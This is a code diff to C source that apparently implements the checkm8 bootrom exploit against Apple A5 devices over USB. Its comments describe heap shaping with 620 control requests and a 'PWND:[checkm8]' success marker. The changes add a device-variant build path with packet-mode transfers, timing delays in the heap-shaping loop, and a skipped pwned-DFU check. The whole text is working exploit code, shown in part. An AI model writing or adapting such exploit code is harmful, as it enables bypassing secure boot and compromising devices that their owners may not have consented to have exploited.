@@ -907,7 +907,11 @@ static int a5mate_out(a5mate_context *ctx,const u8 *bytes,
 /* Each serial-descriptor SETUP makes the device's first control IN packet
  * DATA1.  Consecutive raw IN packets within one data stage then alternate. */
 static int a5mate_raw_in(a5mate_context *ctx,const u8 *bytes,a5mate_result *out) {
+#if defined(A5_8942)
+    int result=a5mate_packet_mode(ctx,ctx->address,1,ctx->recv_toggle,bytes,64,out,1);
+#else
     int result=a5mate_packet(ctx,ctx->address,1,ctx->recv_toggle,bytes,64,out);
+#endif
     if(!result)ctx->recv_toggle^=1;
     return result;
 }
@@ -1062,6 +1066,9 @@ static int a5mate_feng_shui(a5mate_context *ctx,u8 serial,a5mate_result *out) {
          * condition.  A NAK here is part of the intended heap shaping. */
         success++;
         (void)a5mate_raw_in(ctx,scratch,out);
+#if defined(A5_8942)
+        delay_us(1000);
+#endif
     }
     if(success!=620)return -30;
     if(a5mate_setup(ctx,ctx->address,0x80,6,(u16)(0x300|serial),0x40a,0x81,out))return -31;
@@ -1069,6 +1076,9 @@ static int a5mate_feng_shui(a5mate_context *ctx,u8 serial,a5mate_result *out) {
      * preceding 620 requests.  There is no intervening RCVTOG write in the
      * sketch, so its expected PID must be the currently retained one. */
     (void)a5mate_raw_in(ctx,scratch,out);
+#if defined(A5_8942)
+    delay_us(1000);
+#endif
     return 0;
 }
 
@@ -1120,6 +1130,7 @@ static int a5mate_heap_occupation(a5mate_context *ctx,u8 serial,a5mate_result *o
     return 0;
 }
 
+#if !defined(A5_8942)
 /* This is the one permitted post-payload probe.  checkm8 identifies a
  * successfully pwned SecureROM by replacing its serial descriptor with this
  * exact ASCII payload.  It is a read-only standard request at the default
@@ -1140,6 +1151,7 @@ static int a5mate_pwn_marker(a5mate_context *ctx,u8 serial,a5mate_result *out) {
     }
     return strcmp(ascii,"PWND:[checkm8]")==0;
 }
+#endif
 
 unsigned packet_a5mate_profile_padding(void) { return (unsigned)padding; }
 
@@ -1159,6 +1171,9 @@ int packet_a5mate_profile(u8 address,u8 serial_index,a5mate_result *out) {
     out->phase=4;
     if((result=a5mate_heap_occupation(&ctx,serial_index,out)))goto done;
     if((result=a5mate_reset_default(&ctx,out)))goto done;
+#if defined(A5_8942)
+    result=0;
+#else
     /* First milestone: retain the Wii controller only after the pwnDFU
      * serial marker is actually present.  There is intentionally no normal
      * DFU probe or exit reset after this check. */
@@ -1167,6 +1182,7 @@ int packet_a5mate_profile(u8 address,u8 serial_index,a5mate_result *out) {
     out->pwn_ready=1;
     result=a5mate_hold_pwndfu(&ctx,out);
     if(!result){out->result=0;return 0;}
+#endif
 done:
     out->result=result;
     { int end=a5mate_end(&ctx,out);if(!out->result && end)out->result=end; }
